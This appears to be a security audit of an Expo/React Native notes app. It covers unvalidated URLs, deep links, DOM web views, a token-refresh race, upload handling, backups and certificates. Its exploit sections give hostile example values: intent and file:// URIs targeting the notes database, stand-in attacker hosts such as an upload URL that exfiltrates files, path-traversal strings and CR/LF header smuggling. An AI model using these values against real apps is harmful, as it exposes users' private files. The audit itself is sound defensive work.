## H1 — Unvalidated URLs are opened on the phone

**Severity:** High. **Status:** Fixed.

**Where:** `features/notes/render/RichText.tsx:64`, `features/notes/render/MediaView.tsx:103`, `features/resources/ResourceScreen.tsx:79`, `features/resources/Catalogue.tsx:89`, `features/people/ProfileScreen.tsx:299`, `features/learning/FocusCard.tsx:84` and `:186`, `features/feeds/Feeds.tsx:64`, `features/feeds/PostCard.tsx:37`, `features/groups/GroupScreen.tsx:142`, `features/groups/GroupManage.tsx:153`, `features/workspaces/WorkspaceParts.tsx:75`, `:335`, `:347`, `features/moderation/ModerationQueue.tsx:201`, `features/data/YourDataCard.tsx:35`, `features/verification/Verification.tsx:425`, `features/auth/Welcome.tsx:44`.

The rich-text schema in `lib/contracts/validation/rich-text.ts` allows only `http:`, `https:`, and `mailto:`. The phone did not check again. It cast the JSON and called `Linking.openURL` or `WebBrowser.openBrowserAsync`. The same was true for resource links, Meet links, skill source URLs, GitHub links, group and note pictures, export downloads, and verification documents. Those strings are other people’s content or fields the API returns.

**Exploit:** A link, picture, or file URL of `intent:#Intent;action=android.intent.action.VIEW;...` is an Android intent redirection: `Linking.openURL` starts another activity. `file:///data/data/com.learnvianotes/databases/lvn-notes.db` or a `content:` URI hands a local file to whichever app Android resolves. `javascript:` is refused by the contracts schema but was not refused by the phone. Expo Router’s `router.push` does the same for those schemes (`shouldLinkExternally` in `expo-router` opens `intent:`, `file:`, `content:`, `https:`, and turns `//host` into `https://host`).

**Fix:** `lib/open-external.ts` opens only `http:` / `https:` / `mailto:` with no userinfo and no control characters. Pictures load only from `httpUrl`. A file the picker just returned may still be `file://` or `content://`, and that URI cannot contain `..`.

## H2 — Deep links and notification paths

**Severity:** High. **Status:** Fixed.

**Where:** `app/+native-intent.ts:5-10`, `features/notifications/route.ts:5-8`, `features/notifications/NotificationsScreen.tsx:50`, `features/push/push.tsx:19-22`.

`redirectSystemPath` returned the string the system delivered, including from the `catch`. Expo’s own contract for this hook is that the value is not guaranteed to be a path, and a throw must not return the raw input. `phonePath` returned the API’s path unchanged. The in-app notification list then called `router.push` on it. The push-tap path rejected `//`, but the list did not, and neither rejected `intent:`, `file:`, or `..`.

**Exploit:** A notification whose `path` is `intent://…`, `file:///data/data/com.learnvianotes/databases/lvn-notes.db`, `https://evil.example/phish`, or `//evil.example` is opened with the OS, because `router.push` treats those as external. A deep link with `..` (`learnvianotes://../../etc` or `/%2e%2e/admin`) was handed to the router as-is. Another app can start the exported activity with an explicit intent and any data URI; the scheme filter does not apply to explicit intents.

OAuth callbacks (`<scheme>://oauth/callback`) still return `null`, so expo-auth-session keeps the code and the router does not navigate. `https://www.learnvianotes.in/…` and the sandbox host are rewritten to the in-app path. Anything else becomes `/` (deep link) or is dropped (notification).

## H3 — DOM web views (PDF reader and rich-text editor)

**Severity:** High. **Status:** Fixed, with a residual noted below.

**Where:** `features/reader/PdfDom.tsx:124` (`PDFLinkService` with `externalLinkTarget: BLANK`), `features/reader/PdfReaderScreen.tsx:319`, `features/notes/editor/RichTextEditor.tsx:1`, `features/notes/editor/CardEditor.tsx:66`.

Both screens are Expo DOM components. In SDK 58 the DOM web view is created with `allowFileAccess: true`, `allowFileAccessFromFileURLs: true`, `allowingReadAccessToURL: 'file://'`, and `originWhitelist: ['*']` (`node_modules/expo/build/dom/webview-wrapper.js`). `unstable_useExpoModulesBridge` defaults to **false** (it does not expose every native module). The web view still has a message bridge: a page that posts `{ type: 'NATIVE_ACTION' }` invokes the function props passed from React (`onSelection`, `onMark`, `refreshUrl`, and so on).

pdf.js 6.4.299 no longer has `isEvalSupported` (PDF JavaScript eval is gone). `enableXfa` is set false. The remaining hole is navigation. A link or form in a PDF, or `window.open`, can replace the document. The new page inherits file access and the message bridge.

**Exploit:** A PDF (or a rich-text document that contains a link) navigates the web view to `file:///data/data/com.learnvianotes/databases/lvn-notes.db` or to an attacker page. That page reads app files and calls the native callbacks, for example to plant a selection the owner then saves into a note.

**Fix:** Clicks and submits are cancelled in the page. `window.open` is a no-op. A web or mail link in a PDF is opened outside the app; other schemes are ignored. `onShouldStartLoadWithRequest` allows only the DOM bundle (`file:///android_asset/`, `www.bundle`, `.expo-internal`, and `/_expo/` on localhost, a private IP, or an Expo tunnel). `allowFileAccessFromFileURLs` is set false. The PDF bytes themselves are fetched only from an `http(s)` URL (`features/reader/ranges.ts`).

**Residual:** File access cannot be turned off. Expo serves the DOM bundle from `file:///android_asset/www.bundle` in a release build. A bug in the allowlist would still be able to load another file inside that tree. The bundle’s own JavaScript remains trusted and can still call the native props. That is the DOM component model, not an open navigation.

## H4 — Sign-out loses to an in-flight refresh

**Severity:** High. **Status:** Fixed.

**Where:** `lib/auth/session.ts:94-124` (`refreshSession` calls `signedIn`) and `lib/auth/session.ts:76-80` (`signedOut`).

The refresh token is rotated on every use. `refreshSession` loads it, asks the API, and on success calls `signedIn`, which writes the new pair. `signedOut` clears the store and the in-memory token, but it does not cancel a refresh that already started.

**Exploit:** The access token is about to expire, or a request got `UNAUTHENTICATED`, so a refresh is in flight. The person signs out (Settings, or the details form). The refresh response arrives and `signedIn` stores a new pair. The phone is signed in again. On a shared phone the next person opens the app as the previous account. The API has also issued a new refresh token, so the sign-out did not end the family.

**Fix:** Sign-out bumps a generation counter. Token writes are serialized. A refresh captures the generation when it starts and will not save if sign-out has happened since. If it already wrote, it clears the tokens again.

The Settings sign-out still unregisters the push token, calls `signOut`, clears the Apollo store, and then `signedOut` (`features/auth/AccountScreen.tsx:126-129`). Tokens live only in `expo-secure-store` (`lib/auth/storage.ts`), not AsyncStorage. That part was already right.

## H5 — Upload URL, headers, and local URI

**Severity:** High. **Status:** Fixed.

**Where:** `features/notes/media/NoteMedia.tsx:106-140` (`putStoredFile`, `uploadFile`).

`putStoredFile` PUT the bytes to whatever `uploadUrl` the mutation returned and copied every header except `Content-Length`. `uploadFile` did `fetch(picked.uri)` for any URI.

**Exploit:** A mutation response (or a caller) with `uploadUrl: "https://attacker.example/collect"` sends the file there, including a verification document or a note attachment. `uploadUrl: "file:///data/data/com.learnvianotes/databases/lvn-notes.db"` or a header value containing CR/LF smuggles a second header. `uri: "https://attacker.example/x"` makes the phone download that URL and upload it as the user’s file. A `fileName` of `../../photo.jpg` is stored under that name.

**Fix:** The PUT URL must be `http(s)` with no userinfo. Header names must be a short token (`Content-Type`, `x-amz-*`, and the same shape); values cannot contain CR or LF. The source URI must be `file://` or `content://` and cannot contain `..`. The file name sent to the API is the last path segment. Development can still use `http://` storage. `Content-Length` is still omitted so the body size is the size that was signed.

## M1 — Android backup includes the notes database

**Severity:** Medium. **Status:** Needs a decision. Not changed.

**Where:** `app.config.ts:59-73` does not set `android.allowBackup`. Expo’s `withAllowBackup` then sets `android:allowBackup` to **true** (`node_modules/@expo/config-plugins/build/android/AllowBackup.js`, default `config.android?.allowBackup ?? true`).

**Exploit:** Android Auto Backup (and device-to-device transfer) copies `lvn-notes.db`. That SQLite file holds notes, cards, the outbox, and learning events in the clear (`features/notes/store/db.ts:41`). Anyone who can read the Google account backup can read those notes. Session tokens are not in that backup: `expo-secure-store` excludes the `SecureStore` shared-preferences file (`node_modules/expo-secure-store/android/src/main/res/xml/secure_store_backup_rules.xml` and `secure_store_data_extraction_rules.xml`).

**Fix, if you want it:** set `android.allowBackup: false` in `app.config.ts`. That stops backup of the notes database and also stops using backup to move the app to a new phone. Say so and it can be a separate change. This audit did not flip it, because it changes what happens to a person’s notes on a new device.

## M2 — Notes stay on the phone after sign-out

**Severity:** Medium. **Status:** Needs a decision. Not changed.

**Where:** `features/notes/sync/engine.ts:74-78`. The database is wiped only when a different account id is seen. `signedOut` clears tokens and the Apollo cache, not SQLite.

**Exploit:** Person A signs out. The notes are not shown (the signed-out stack does not mount them), but `lvn-notes.db` still has them. Person B, or someone with a backup or a rooted device, can read A’s notes before B signs in. When B signs in, the different subject wipes the file. If A signs back in while offline, keeping the file is what makes those notes available.

**Fix, if you want it:** wipe the database inside the sign-out path. That removes the shared-phone copy and also removes the offline copy A would have seen after signing back in. Needs a product decision.

## M3 — Release builds use the debug keystore

**Severity:** Medium. **Status:** Left as-is on purpose.

**Where:** `scripts/build-android.mjs:12-13` and `:36` (`assembleRelease`).

The release APK is signed with Expo’s debug keystore so it can be sideloaded. It is not `debuggable` (that flag is off for `assembleRelease`). It cannot ship to Play until a real upload key exists. This change does not touch signing, the keystore, or the release task.

`android:debuggable` is not set in `app.config.ts`. A debug build is debuggable; a release build is not.

## M4 — Certificate handling

**Severity:** Medium (pinning absent). **Status:** Needs a decision. Not changed.

There is no custom trust manager, no `trustAll`, and no pinning. TLS uses the platform store. Cleartext is allowed only for the development variant (`app.config.ts:90-92`, `usesCleartextTraffic: current === 'development'`). Sandbox and production env files are `https` and `wss`.

**Exploit:** A trusted-CA or user-installed-CA proxy can read GraphQL, including tokens and note bodies. Pinning would reject that. It also breaks when the certificate rotates unless pins are updated with the app.

**Fix, if you want it:** pin the production and sandbox leaf or CA in a network security config, with a planned rotation. Do not add a debug override that trusts user CAs in release. Not done here because there is no pin set to ship.

## M5 — Config schema accepted non-web URLs

**Severity:** Medium. **Status:** Fixed (small, and tests cover it).

**Where:** `lib/parse-env.ts:12-15` used `z.url()`, which accepts `javascript:` and `intent:`. Sandbox and production were not required to be `https` / `wss`.

Android already blocks cleartext outside development, so a production build pointed at `http://` would fail to connect rather than send tokens in the clear. The schema now rejects non-`http(s)` API and web URLs, rejects userinfo on those URLs, requires `https` for the GitHub authorize URL, requires `https` for the Sentry DSN, and refuses cleartext when `EXPO_PUBLIC_APP_ENV` is `sandbox` or `production`. Development may still use `http` and `ws`.

## L2 — Logging

**Severity:** Low. **Status:** Report.

No `console.log` of tokens or emails in app code. Sentry is off unless `EXPO_PUBLIC_SENTRY_DSN` is set. `sendDefaultPii`, screenshots, and the view hierarchy are off (`lib/observability.ts:16-24`, `app.config.ts:108-114`). `beforeSend` drops the user, cookies, request body, query string, and headers, and strips query strings from URLs. Console breadcrumbs are dropped. `lib/client-errors.ts` strips email addresses and `http` / `file` URLs before `ingestAnalytics`, but not a raw JWT if one were ever placed in an error string. Upload failures report a fixed sentence, not the URL or the file name.

The live socket sends the access token in `connectionParams`, not in the URL (`features/notifications/live.ts:33-35`), so it is not written into proxy logs as a query string.

## L3 — SecureStore is not biometric

**Severity:** Low. **Status:** Report.

Tokens use `expo-secure-store` with the default options (`lib/auth/storage.ts`). On Android that is the keystore, available after the device is unlocked. `requireAuthentication` is not set, so opening the app does not prompt for biometrics. That matches a normal session. Turn it on only if you want every read of the refresh token to require biometrics; it changes sign-in on every cold start.

## Checked and sound

- **Token storage.** Access token, expiry, and refresh token are separate SecureStore keys. The refresh token is written first. There is no AsyncStorage or MMKV use for tokens. The access token in memory is cleared on sign-out.
- **Google sign-in.** Firebase Auth uses in-memory persistence. Both Firebase and Google Sign-In are signed out immediately after the Firebase ID token is read (`lib/auth/google.ts:96-106`). The ID token is not stored.
- **Logout path that matters.** Settings unregisters push, revokes the session, clears Apollo, then clears SecureStore. The details-form sign-out happens before push is registered (`app/_layout.tsx:155` mounts `PushSetup` only when registration is complete).
- **Account id.** The JWT subject is used only to decide which local notes belong to the signed-in account. It is not treated as proof for an API call. The API still checks the token.
- **SQL.** Note queries are parameterized. The only interpolation is the migration version, which is a loop index.
- **Markdown.** `lib/markdown.ts` builds a tree of text nodes. It does not emit HTML.
- **Rich text on screen.** Native `<Text>`, not a web view, except the editor (H3).
- **Deep link parameters that were already checked.** `app/notes/capture.tsx` allows only `camera` | `library` | `files`. Class join codes are GraphQL variables, not URLs.
- **Permissions.** Camera, microphone, and photos are requested for notes and voice notes. The microphone permission is not set to `false` (that would strip `RECORD_AUDIO`). No SMS, contacts, location, or overlay permission is declared in config.
- **Exported components.** The launcher and the variant URL scheme require an exported activity. No extra exported component is added in `app.config.ts`. `ios/` and `android/` are generated and are not in git; this review used the config and Expo’s prebuild plugins, not a hand-edited manifest.
- **Cleartext.** Development only. See M4 and M5.
- **Certificate bypass.** None.

## What this change does not do

- It does not set `allowBackup`, wipe notes on sign-out, add pinning, or change the debug keystore.
- It does not bump Expo to chase the zod advisory in the CLI.
- It does not merge or stack on PR #19.
